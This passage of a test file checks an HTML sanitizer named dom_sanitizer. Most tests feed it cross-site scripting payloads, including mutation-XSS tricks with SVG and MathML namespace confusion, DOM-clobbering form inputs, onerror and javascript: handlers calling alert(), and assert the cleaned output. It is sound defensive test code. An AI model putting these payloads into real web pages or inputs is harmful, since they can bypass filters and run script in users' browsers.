      "<div id=\"135\">\n\n<template>\nnew ActiveXObject('htmlfile').parentWindow.alert(135)\n<head></head><body></body>\n</template>\n//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"135\">\n\n\n//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"136\"><form action=\"x\" method=\"post\">\n<input name=\"username\" value=\"admin\" />\n<input name=\"password\" type=\"password\" value=\"secret\" />\n<input name=\"injected\" value=\"injected\" dirname=\"password\" />\n<input type=\"submit\">\n</form>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"136\"><form action=\"x\" method=\"post\">\n<input name=\"username\" value=\"admin\">\n<input name=\"password\" type=\"password\" value=\"secret\">\n<input name=\"injected\" value=\"injected\">\n<input type=\"submit\">\n</form>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"136\"><form action=\"x\" method=\"post\">\n<input name=\"username\" value=\"admin\">\n<input name=\"password\" type=\"password\" value=\"secret\">\n<input name=\"injected\" value=\"injected\">\n<input type=\"submit\">\n</form>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "SVG 2" {
  let payload = "<div id=\"137\"><svg>\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"?\">\n<circle r=\"400\"></circle>\n<animate attributeName=\"xlink:href\" begin=\"0\" from=\"javascript:alert(137)\" to=\"&\" />\n</a>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"137\"><svg>\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"?\">\n<circle r=\"400\"></circle>\n\n</a>//[\"'`--&gt;]]&gt;]</svg></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "DOM clobbering: submit" {
  let payload = "<input name=submit>123"
  assert_true(["<input>123"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "DOM clobbering: acceptCharset" {
  let payload = "<input name=acceptCharset>123"
  assert_true(["<input>123"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "DOM clobbering: hasChildNodes" {
  let payload = "<form><input name=hasChildNodes>"
  assert_true(
    ["<form><input></form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Testing support for sizes and srcset" {
  let payload = "<img src=\"small.jpg\" srcset=\"medium.jpg 1000w, large.jpg 2000w\">"
  assert_true(
    [
      "<img src=\"small.jpg\" srcset=\"medium.jpg 1000w, large.jpg 2000w\">", "<img srcset=\"medium.jpg 1000w, large.jpg 2000w\" src=\"small.jpg\">",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Testing support for inert" {
  let payload = "<div inert></div>"
  assert_true(
    ["<div inert=\"\"></div>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against mXSS behavior with SVG in Chrome 77 and alike 1/2" {
  let payload = "<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>"
  assert_true(
    [
      "", "<svg></svg><p></p><textarea>&lt;title&gt;&lt;style&gt;</textarea><img src=\"x\">",
      "<svg></svg>", "<svg></svg><p></p><img src=\"x\">", "<svg xmlns=\"http://www.w3.org/2000/svg\" />",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against mXSS behavior with SVG in Chrome 77 and alike 2/2" {
  let payload = "<svg></p><title><a id=\"</title><img src=x onerror=alert()>\"></textarea></svg>"
  assert_true(
    [
      "", "<svg></svg><p></p><title>&lt;a id=\"</title><img src=\"x\">\"&gt;", "<svg><title><a id=\"</title><img src=x onerror=alert()>\"></a></title></svg>",
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><title><a id=\"</title><img src=x onerror=alert()>\"></a></title></svg>",
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><title><a id=\"</title><img src=x onerror=alert()>\"></a></title></title></svg></svg>",
      "<svg><title></title></svg>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against mXSS behavior with MathML in Chrome 77 and alike" {
  let payload = "<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>"
  assert_true(
    [
      "", "<math></math><p></p><textarea>&lt;mi&gt;&lt;style&gt;</textarea><img src=\"x\">",
      "<math></math><p></p><img src=\"x\">", "<math></math>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against mXSS behavior with SVG Templates in Chrome 77 and alike" {
  let payload = "<svg></p><title><template><style></title><img src=x onerror=alert(1)>"
  assert_true(
    [
      "", "<svg></svg><p></p><title>&lt;template&gt;&lt;style&gt;</title><img src=\"x\">",
      "<svg></svg><p></p><img src=\"x\">", "<svg><title><template></template></title></svg>",
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><title><template></template></title></svg>",
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><title><template></template></title></title></svg></svg>",
      "<svg><title></title></svg>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against mXSS behavior with MathML Templates in Chrome 77 and alike" {
  let payload = "<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>"
  assert_true(
    [
      "", "<math></math>", "<math></math><br><textarea>&lt;mtext&gt;&lt;template&gt;&lt;style&gt;</textarea><img src=\"x\">",
      "<math></math><br><img src=\"x\">",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Fixed an exception coming from missing clobbering protection" {
  let payload = "<form><input name=namespaceURI>"
  assert_true(
    ["", "<form><input></form>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against mXSS behavior with embedded MathML/SVG" {
  let payload = "<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>"
  assert_true(
    [
      "", "<svg></svg>", "<svg></svg><p></p><math></math><img src=\"x\">", "<svg></svg><p></p><img src=\"x\">",
      "<svg xmlns=\"http://www.w3.org/2000/svg\" />",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against attribute-based mXSS behavior 1/3" {
  let payload = "<svg><p><style><g title=\"</style><img src=x onerror=alert(1)>\">"
  assert_true(
    [
      "<svg></svg><p></p><style><g title=\"</style><img src=\"x\">\"&gt;", "<svg></svg><p></p><img src=\"x\">\"&gt;",
      "<svg></svg><p><img src=\"x\">\"&gt;</p>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against attribute-based mXSS behavior 2/3" {
  let payload = "<svg><foreignobject><p><style><p title=\"</style><iframe onload&#x3d;alert(1)<!--\"></style>"
  assert_true(["<svg></svg>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Tests against attribute-based mXSS behavior 3/3" {
  let payload = "<math><annotation-xml encoding=\"text/html\"><p><style><p title=\"</style><iframe onload&#x3d;alert(1)<!--\"></style>"
  assert_true(["<math></math>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Tests against removal-based mXSS behavior 1/2" {
  let payload = "<xmp><svg><b><style><b title='</style><img>'>"
  assert_true([""].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Tests against removal-based mXSS behavior 2/2" {
  let payload = "<noembed><svg><b><style><b title='</style><img>'>"
  assert_true([""].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Tests against nesting-based mXSS behavior 1/5" {
  let payload = "<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>"
  assert_true(
    ["<form><math><mtext><form></form></mtext></math></form>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against nesting-based mXSS behavior 2/5" {
  let payload = "<math><mtext><table><mglyph><style><math href=javascript:alert(1)>CLICKME</math>"
  assert_true(
    ["<math><mtext><table></table></mtext></math>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against nesting-based mXSS behavior 3/5" {
  let payload = "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert(1)&gt;\">"
  assert_true(
    ["<math><mtext><table></table></mtext></math>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against nesting-based mXSS behavior 4/5" {
  let payload = "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">"
  assert_true(
    ["<form><math><mtext><form></form></mtext></math></form>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against nesting-based mXSS behavior 5/5" {
  let payload = "<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">"
  assert_true(
    ["", "<math><mtext><table></table></mtext></math>", "<math></math>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against additional problems regarding HTML inside MathML 1/2" {
  let payload = "<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title=\"</style><img src onerror='alert(1)'>\"></style></h1>"
  assert_true(
    ["<math><mtext><h1><a></a><h6><a></a></h6></h1></mtext></math>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against additional problems regarding HTML inside MathML 2/2" {
  let payload = "<!-- more soon -->"
  assert_true([""].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Test against fake-element-based namepsace-confusion abusing mXSS attacks 1/2" {
  let payload = "a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title=\"&lt;/style>&lt;img src onerror=alert(1)>\">"
  assert_true(
    ["a<svg><desc></desc></svg>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Test against fake-element-based namepsace-confusion abusing mXSS attacks 2/2" {
  let payload = "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src='#' onerror='alert(1)'>\">"
  assert_true(
    ["<math><mtext><option><option></option></option></mtext></math>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Tests against proper handling of leading whitespaces" {
  let payload = " "
  assert_true([" "].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Tests against proper handling of empty MathML containers" {
  let payload = "<div><math></math></div>"
  assert_true(
    ["<div><math></math></div>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Tests against proper handling of is attributes (which cannot be removed)" {
  let payload = "<b is=\"foo\">bar</b>"
  assert_true(["<b is=\"\">bar</b>"].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test "Tests against removal of templates inside select elements" {
  let payload = "<select><template><img src=x onerror=alert(1)></template></select>"
  assert_true(
    ["<select><template><img src=\"x\"></template></select>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test "Testing support for search" {
  let payload = "<header><h1>Movie website</h1><search><form action=\"./search/\"><label for=\"movie\">Find a Movie</label><input type=\"search\" id=\"movie\" name=\"q\" /><button type=\"submit\">Search</button></form></search></header>"
  assert_true(
    [
      "<header><h1>Movie website</h1><search><form action=\"./search/\"><label for=\"movie\">Find a Movie</label><input type=\"search\" id=\"movie\" name=\"q\"><button type=\"submit\">Search</button></form></search></header>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test "Does not remove the SVG 'mask-type' attribute" {
  let payload = "<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"><mask id=\"a\" mask-type=\"alpha\"><rect width=\"100%\" height=\"100%\" fill=\"rgb(10% 10% 10% / 0.4)\"></rect><circle cx=\"50\" cy=\"50\" r=\"35\" fill=\"rgb(90% 90% 90% / 0.6)\"></circle></mask><rect width=\"45\" height=\"45\" fill=\"red\" mask=\"url(#a)\"></rect></svg>"
  assert_true(
    [
      "<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"><mask id=\"a\" mask-type=\"alpha\"><rect width=\"100%\" height=\"100%\" fill=\"rgb(10% 10% 10% / 0.4)\"></rect><circle cx=\"50\" cy=\"50\" r=\"35\" fill=\"rgb(90% 90% 90% / 0.6)\"></circle></mask><rect width=\"45\" height=\"45\" fill=\"red\" mask=\"url(#a)\"></rect></svg>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}
